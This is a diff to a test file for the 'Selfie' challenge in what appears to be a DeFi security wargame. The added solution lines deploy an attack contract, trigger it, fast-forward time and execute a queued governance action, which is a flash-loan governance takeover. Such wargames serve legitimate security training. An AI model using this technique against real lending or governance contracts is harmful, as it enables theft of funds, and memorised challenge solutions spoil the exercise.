@@ -32,6 +32,10 @@ describe('[Challenge] Selfie', function () {
     expect(await pool.flashFee(token, 0)).to.eq(0);
 
     /** CODE YOUR SOLUTION HERE */
+    const attack = await ethers.deployContract('SelfieAttack', [pool, governance], player);
+    await attack.attack();
+    await time.increase(2 * 24 * 60 * 60);
+    await governance.executeAction(1);
 
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
